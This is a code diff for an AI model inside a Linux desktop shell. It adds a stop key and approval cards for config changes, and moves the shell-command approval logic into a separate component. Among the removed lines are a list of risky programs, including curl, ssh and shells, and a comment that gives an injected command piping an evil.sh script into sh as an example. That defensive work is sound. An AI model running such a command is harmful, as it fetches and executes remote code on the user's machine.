@@ -6,6 +6,7 @@ import qs.services
 import Quickshell
 import Quickshell.Io
 import QtQuick
+import "configView.js" as ConfigView
 
 /**
  * Runs the tool calls a turn asked for, holds the approval rules that gate the
@@ -30,13 +31,19 @@ QtObject {
     property var _queueMessage: null
     property string _currentCallId: ""
 
+    // Set by the stop key (stopTurn), cleared by the next batch of calls: a tool that
+    // finishes after the stop does not ask the model again.
+    property bool halted: false
+
     function runCalls(calls, message: AiMessageData) {
+        root.halted = false;
         root._queue = (calls ?? []).slice();
         root._queueMessage = message;
         root.runNextCall();
     }
 
     function runNextCall() {
+        if (root.halted) return;
         if (root._queue.length === 0) {
             root._currentCallId = "";
             root.engine.requester.makeRequest();
@@ -102,53 +109,6 @@ QtObject {
         return found;
     }
 
-    // Programs where the arguments decide whether the command is destructive.
-    // `find . -name x` and `find / -delete` share a program and nothing else.
-    readonly property var argumentsDecideRisk: [
-        "rm", "rmdir", "shred", "dd", "truncate", "mv", "cp", "install", "tee",
-        "chmod", "chown", "chgrp", "setfacl", "find", "xargs",
-        "mkfs", "fdisk", "sgdisk", "parted", "wipefs", "mount", "umount",
-        "kill", "pkill", "killall", "systemctl", "loginctl", "hyprctl",
-        "curl", "wget", "ssh", "scp", "rsync", "git",
-        "pacman", "yay", "paru", "apt", "dnf", "sudo", "doas", "su",
-        "sh", "bash", "zsh", "fish", "python", "python3", "node", "bun", "perl",
-    ]
-
-    // The key an approval is stored and matched under. A plain command is keyed by its
-    // program, so approving `free -h` also covers `free -m`. Anything carrying shell
-    // metacharacters is keyed by the whole string: approving `du -sh ~` must not hand
-    // over `du -sh ~; curl evil.sh | sh`. So is anything on the list above, where a
-    // program-wide rule would be a rule about a verb rather than about what it does.
-    function commandRule(command: string): string {
-        const cmd = command.trim();
-        const meta = [";", "|", "&", ">", "<", "\n", "$(", "`", "\\"];
-        if (meta.some(c => cmd.includes(c))) return cmd;
-        const program = cmd.split(/\s+/)[0];
-        const base = program.split("/").pop();
-        return root.argumentsDecideRisk.includes(base) ? cmd : program;
-    }
-
-    function isPreApproved(name: string, args: var): bool {
-        const policy = root.engine.toolRegistry.approvalOf(name);
-        if (policy === "never") return true;
-        if (policy === "always") return false;
-        const approvals = Config.options?.ai?.approvals;
-        if (name === "ask_agent") return approvals?.agent === true;
-        const rules = approvals?.shellRules ?? [];
-        return rules.includes(root.commandRule(args.command ?? ""));
-    }
-
-    function rememberApproval(name: string, args: var) {
-        if (root.engine.toolRegistry.approvalOf(name) !== "once") return;
-        if (name === "ask_agent") {
-            Config.options.ai.approvals.agent = true;
-            return;
-        }
-        const rule = root.commandRule(args.command);
-        const rules = Config.options.ai.approvals.shellRules ?? [];
-        if (!rules.includes(rule)) Config.options.ai.approvals.shellRules = [...rules, rule];
-    }
-
     function rejectCommand(message: AiMessageData) {
         if (!message.functionPending) return;
         message.functionPending = false; // User decided, no more "thinking"
@@ -167,14 +127,15 @@ QtObject {
         message.functionPending = false; // User decided, no more "thinking"
         const name = message.functionCall?.name ?? message.functionName;
         root._currentCallId = message.functionCall?.id ?? root._currentCallId;
-        if (always) root.rememberApproval(name, message.functionCall.args);
+        if (always) root.engine.approval.rememberApproval(name, message.functionCall.args);
         root.runApprovedCall(name, message.functionCall.args);
     }
 
     function runApprovedCall(name: string, args: var) {
+        // these finish in their own handler once nothing is left to ask
+        if (["browser", "desktop", "set_shell_config"].includes(name)) return root.handlers[name](args, null, true);
         const responseMessage = root.addToolResult(name, "", false, false);
-        // hidden only for the agent: the user just approved a command and gets to
-        // watch its output stream into the bubble
+        // hidden only for the agent: an approved command streams its output into the bubble
         responseMessage.visibleToUser = (name !== "ask_agent");
 
         if (name === "ask_agent") {
@@ -191,6 +152,28 @@ QtObject {
         commandExecutionProc.running = true; // Start the command execution
     }
 
+    // A call that waits for the user: the request goes into the message as a fence the
+    // chat renders as the approval card, and the buttons decide this exact call.
+    function askFirst(message: AiMessageData, header: string, lang: string, shown: string, name: string, args: var) {
+        const request = `\n\n**${header}**\n\n\`\`\`${lang}\n${shown}\n\`\`\``;
+        message.rawContent += request;
+        message.content += request;
+        message.functionCall = { "name": name, "args": args, "id": root._currentCallId, "summary": shown };
+        message.functionPending = true;
+    }
+
+    // The stop key: the turn ends here. Nothing queued runs, a card still waiting is
+    // answered as declined, and a tool that finishes later does not ask the model again.
+    function stopTurn() {
+        root.halted = true;
+        root._queue = [];
+        root.toolStatusLabel = "";
+        const conversation = root.engine.conversation;
+        for (const id of conversation.messageIDs)
+            if (conversation.messageByID[id]?.functionPending) root.rejectCommand(conversation.messageByID[id]);
+        root._currentCallId = "";
+    }
+
     // One entry per tool name in ToolRegistry. A handler either finishes the call by
     // adding its result and calling runNextCall(), or hands off to a process that
     // does so on exit; a handler that waits for the user does neither until they act.
@@ -203,15 +186,19 @@ QtObject {
         },
 
         "get_shell_config": (args, message) => {
-            const configJson = CF.ObjectUtils.toPlainObject(Config.options);
-            root.addToolResult("get_shell_config", JSON.stringify(configJson), false);
+            root.addToolResult("get_shell_config", ConfigView.render(CF.ObjectUtils.toPlainObject(Config.options), args.section), false);
             root.runNextCall();
         },
 
-        "set_shell_config": (args, message) => {
+        "set_shell_config": (args, message, approved) => {
             if (!args.key || !args.value) {
                 root.addToolResult("set_shell_config", Translation.tr("Invalid arguments. Must provide `key` and `value`."), false);
                 root.runNextCall();
+                return;
+            }
+            // it never asks, except in a turn the web has tainted (ToolApproval.tainted)
+            if (!approved && !root.engine.approval.isPreApproved("set_shell_config", args)) {
+                root.askFirst(message, Translation.tr("Config change request"), "config", `${args.key} = ${args.value}`, "set_shell_config", args);
                 return;
             }
             Config.setNestedValue(args.key, args.value);
@@ -225,7 +212,7 @@ QtObject {
                 root.runNextCall();
                 return;
             }
-            const preApproved = root.isPreApproved("run_shell_command", args);
+            const preApproved = root.engine.approval.isPreApproved("run_shell_command", args);
             const header = preApproved
                 ? Translation.tr("Ran this, you approved it before")
                 : Translation.tr("Command execution request");
@@ -296,6 +283,8 @@ QtObject {
 
         "search_web": (args, message) => root.runWebTool("search_web", args, message),
         "fetch_url": (args, message) => root.runWebTool("fetch_url", args, message),
+        "browser": (args, message, approved) => root.engine.browserTool.handle(args, message, approved === true),
+        "desktop": (args, message, approved) => root.engine.desktopTool.handle(args, message, approved === true),
 
         "ask_agent": (args, message) => {
             const task = (args.task ?? "").trim();
@@ -317,7 +306,7 @@ QtObject {
 
             // the agent runs an unsandboxed shell, so it waits for a click like
             // run_shell_command does. approveCommand() starts agentProc.
-            const agentApproved = root.isPreApproved("ask_agent", args);
+            const agentApproved = root.engine.approval.isPreApproved("ask_agent", args);
             const agentHeader = agentApproved
                 ? Translation.tr("Asked the agent, you approved it before")
                 : Translation.tr("Agent task request");
